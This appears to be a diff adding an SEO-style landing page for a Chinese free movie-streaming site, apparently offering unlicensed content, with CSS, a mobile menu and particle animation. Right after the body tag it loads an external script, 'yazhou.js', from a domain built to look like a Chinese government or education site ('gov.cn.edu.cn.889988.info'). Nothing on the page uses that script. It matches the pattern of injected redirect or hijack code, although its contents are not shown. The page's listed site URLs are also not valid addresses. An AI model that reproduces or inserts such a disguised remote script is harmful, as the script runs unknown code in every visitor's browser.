@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>美亚电影网 - 高清影视在线观看</title>
+<meta name="description" content="美亚电影网(meiyadianyingwang-app)提供最新电影、电视剧、综艺、动漫在线高清观看，每日更新，免费畅享海量影视资源。">
+<meta name="keywords" content="美亚电影网,meiyadianyingwang-app,电影,电视剧,在线观看,高清影视">
+<!-- 针对必应搜索引擎的优化提示 -->
+<meta name="msvalidate.01" content="BING-SITE-VERIFICATION-CODE" /> 
+<style>
+/* 全局与重置 */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    color: #e0e0e0;
+    line-height: 1.6;
+    min-height: 100vh;
+    overflow-x: hidden;
+}
+
+/* 动态背景粒子效果 */
+#particles {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.3;
+}
+
+/* 头部导航 - 玻璃拟态 */
+header {
+    position: fixed;
+    top: 0;
+    width: 100%;
+    z-index: 1000;
+    background: rgba(15, 12, 41, 0.7);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    transition: all 0.3s ease;
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 1rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.logo {
+    font-size: 1.8rem;
+    font-weight: 700;
+    background: linear-gradient(45deg, #ff6b6b, #ffa500, #ff6b6b);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    text-decoration: none;
+    letter-spacing: 1px;
+}
+
+.nav-menu {
+    display: flex;
+    list-style: none;
+    gap: 1.5rem;
+}
+
+.nav-menu a {
+    color: #e0e0e0;
+    text-decoration: none;
+    font-size: 1rem;
+    font-weight: 500;
+    padding: 0.5rem 1rem;
+    border-radius: 20px;
+    transition: all 0.3s ease;
+    position: relative;
+}
+
+.nav-menu a:hover {
+    color: #ffa500;
+    background: rgba(255, 165, 0, 0.1);
+}
+
+/* 移动端菜单按钮 */
+.menu-toggle {
+    display: none;
+    flex-direction: column;
+    cursor: pointer;
+    gap: 4px;
+}
+
+.menu-toggle span {
+    width: 25px;
+    height: 3px;
+    background: #ffa500;
+    border-radius: 2px;
+    transition: all 0.3s ease;
+}
+
+/* 主内容区 */
+main {
+    margin-top: 80px;
+    padding: 2rem 1rem;
+}
+
+.section {
+    max-width: 1200px;
+    margin: 0 auto 3rem;
+    padding: 2.5rem;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 20px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+}
+
+.section h1, .section h2 {
+    text-align: center;
+    margin-bottom: 1.5rem;
+    font-weight: 700;
+}
+
+.section h1 {
+    font-size: 2.5rem;
+    background: linear-gradient(45deg, #ff6b6b, #ffa500);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+.section h2 {
+    font-size: 2rem;
+    color: #ffa500;
+}
+
+.section p {
+    text-align: center;
+    margin-bottom: 1.5rem;
+    font-size: 1.1rem;
+    color: #b0b0b0;
+}
+
+/* 网址展示 */
+.url-box {
+    text-align: center;
+    margin: 2rem 0;
+    padding: 1rem;
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 10px;
+    border: 1px dashed rgba(255, 165, 0, 0.5);
+}
+
+.url-box a {
+    color: #ffa500;
+    font-size: 1.3rem;
+    font-weight: 600;
+    text-decoration: none;
+    word-break: break-all;
+}
+
+.url-box a:hover {
+    text-decoration: underline;
+}
+
+/* 特色卡片网格 */
+.grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 1.5rem;
+    margin-top: 2rem;
+}
+
+.card {
+    background: rgba(255, 255, 255, 0.08);
+    padding: 1.5rem;
+    border-radius: 15px;
+    text-align: center;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    border: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.card:hover {
+    transform: translateY(-10px);
+    box-shadow: 0 10px 20px rgba(255, 165, 0, 0.2);
+    border-color: rgba(255, 165, 0, 0.3);
+}
+
+.card h3 {
+    color: #ffa500;
+    margin-bottom: 1rem;
+    font-size: 1.3rem;
+}
+
+.card p {
+    font-size: 0.95rem;
+    color: #c0c0c0;
+}
+
+/* 页脚 */
+footer {
+    text-align: center;
+    padding: 2rem 1rem;
+    background: rgba(15, 12, 41, 0.9);
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+    margin-top: 3rem;
+}
+
+footer p {
+    color: #888;
+    font-size: 0.9rem;
+}
+
+/* 移动端自适应 */
+@media (max-width: 768px) {
+    .nav-container {
+        flex-wrap: wrap;
+    }
+    
+    .menu-toggle {
+        display: flex;
+    }
+    
+    .nav-menu {
+        display: none;
+        width: 100%;
+        flex-direction: column;
+        text-align: center;
+        padding: 1rem 0;
+        gap: 0.5rem;
+    }
+    
+    .nav-menu.active {
+        display: flex;
+    }
+    
+    .nav-menu a {
+        padding: 0.8rem;
+        border-radius: 10px;
+    }
+    
+    .section {
+        padding: 1.5rem;
+        margin-bottom: 2rem;
+    }
+    
+    .section h1 {
+        font-size: 2rem;
+    }
+    
+    .section h2 {
+        font-size: 1.6rem;
+    }
+    
+    .grid {
+        grid-template-columns: 1fr;
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 动态背景画布 -->
+<canvas id="particles"></canvas>
+
+<header>
+    <div class="nav-container">
+        <a href="#" class="logo">美亚电影网</a>
+        <div class="menu-toggle" onclick="toggleMenu()">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <ul class="nav-menu" id="navMenu">
+            <li><a href="#home">首页</a></li>
+            <li><a href="#movies">电影</a></li>
+            <li><a href="#series">剧集</a></li>
+            <li><a href="#about">关于我们</a></li>
+            <li><a href="#contact">联系方式</a></li>
+        </ul>
+    </div>
+</header>
+
+<main>
+    <!-- 首页栏目 -->
+    <section id="home" class="section">
+        <h1>欢迎来到美亚电影网</h1>
+        <p>您的专属高清影视乐园，海量资源每日更新，免费在线畅享。</p>
+        <div class="url-box">
+            <p>访问网址：</p>
+            <a href="https://meiyadianyingwang-app" target="_blank" rel="noopener">https://meiyadianyingwang-app</a>
+        </div>
+        <p>美亚电影网致力于为影迷提供最流畅、最清晰的观影体验，涵盖最新院线大片、经典老片、热播剧集、综艺动漫等全品类内容。</p>
+    </section>
+
+    <!-- 电影栏目 -->
+    <section id="movies" class="section">
+        <h2>热门电影</h2>
+        <p>每日精选最新、最热门的电影资源，支持超清画质在线播放。</p>
+        <div class="grid">
+            <div class="card">
+                <h3>动作科幻</h3>
+                <p>震撼视效，感受大片魅力。</p>
+            </div>
+            <div class="card">
+                <h3>悬疑犯罪</h3>
+                <p>烧脑剧情，挑战你的推理极限。</p>
+            </div>
+            <div class="card">
+                <h3>喜剧爱情</h3>
+                <p>轻松幽默，温暖你的闲暇时光。</p>
+            </div>
+            <div class="card">
+                <h3>恐怖惊悚</h3>
+                <p>心跳加速，体验极致刺激。</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- 剧集栏目 -->
+    <section id="series" class="section">
+        <h2>热播剧集</h2>
+        <p>同步更新国内外热门电视剧、网剧、综艺节目。</p>
+        <div class="grid">
+            <div class="card">
+                <h3>大陆剧</h3>
+                <p>热门国产剧集，追剧不间断。</p>
+            </div>
+            <div class="card">
+                <h3>美剧韩剧</h3>
+                <p>海外佳作，中文字幕同步更新。</p>
+            </div>
+            <div class="card">
+                <h3>综艺动漫</h3>
+                <p>最新综艺、经典动漫一网打尽。</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- 关于我们栏目 -->
+    <section id="about" class="section">
+        <h2>关于美亚电影网</h2>
+        <p>美亚电影网（meiyadianyingwang-app）是一个专注于影视资源分享的在线平台。我们拥有强大的技术团队，确保网站稳定、高速，让您随时随地享受观影乐趣。</p>
+        <p>网站名称：<strong>美亚电影网</strong></p>
+        <p>网站网址：<a href="https://meiyadianyingwang-app" style="color:#ffa500;">https://meiyadianyingwang-app</a></p>
+    </section>
+
+    <!-- 联系方式栏目 -->
+    <section id="contact" class="section">
+        <h2>联系我们</h2>
+        <p>如果您有任何问题、建议或合作意向，欢迎通过以下方式联系我们：</p>
+        <div class="grid">
+            <div class="card">
+                <h3>商务合作</h3>
+                <p>邮箱：business@meiyadianyingwang-app.com</p>
+            </div>
+            <div class="card">
+                <h3>用户反馈</h3>
+                <p>邮箱：feedback@meiyadianyingwang-app.com</p>
+            </div>
+        </div>
+        <p style="margin-top: 2rem; font-size: 0.9rem; color: #666;">（此为演示单页，联系方式为示例）</p>
+    </section>
+</main>
+
+<footer>
+    <p>&copy; 2024 美亚电影网 (meiyadianyingwang-app). All rights reserved.</p>
+    <p>网站名称：美亚电影网 | 网址：https://meiyadianyingwang-app</p>
+</footer>
+
+<script>
+// 移动端菜单切换
+function toggleMenu() {
+    const menu = document.getElementById('navMenu');
+    menu.classList.toggle('active');
+}
+
+// 平滑滚动（增强SEO与体验）
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+            target.scrollIntoView({
+                behavior: 'smooth',
+                block: 'start'
+            });
+        }
+        // 移动端点击后自动关闭菜单
+        if (window.innerWidth <= 768) {
+            document.getElementById('navMenu').classList.remove('active');
+        }
+    });
+});
+
+// 动态粒子背景（轻量级）
+const canvas = document.getElementById('particles');
+const ctx = canvas.getContext('2d');
+let particlesArray = [];
+
+function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+}
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+
+class Particle {
+    constructor() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.size = Math.random() * 2 + 0.5;
+        this.speedX = Math.random() * 1 - 0.5;
+        this.speedY = Math.random() * 1 - 0.5;
+        this.color = `rgba(255, 165, 0, ${Math.random() * 0.5 + 0.1})`;
+    }
+    update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        if (this.x > canvas.width || this.x < 0) this.speedX *= -1;
+        if (this.y > canvas.height || this.y < 0) this.speedY *= -1;
+    }
+    draw() {
+        ctx.fillStyle = this.color;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+    }
+}
+
+function initParticles() {
+    particlesArray = [];
+    const numberOfParticles = (canvas.width * canvas.height) / 15000;
+    for (let i = 0; i < numberOfParticles; i++) {
+        particlesArray.push(new Particle());
+    }
+}
+initParticles();
+
+function animateParticles() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    for (let i = 0; i < particlesArray.length; i++) {
+        particlesArray[i].update();
+        particlesArray[i].draw();
+    }
+    requestAnimationFrame(animateParticles);
+}
+animateParticles();
+
+// 监听滚动改变头部透明度（增强玻璃拟态效果）
+window.addEventListener('scroll', () => {
+    const header = document.querySelector('header');
+    if (window.scrollY > 50) {
+        header.style.background = 'rgba(15, 12, 41, 0.95)';
+    } else {
+        header.style.background = 'rgba(15, 12, 41, 0.7)';
+    }
+});
+</script>
+
+</body>
+</html>
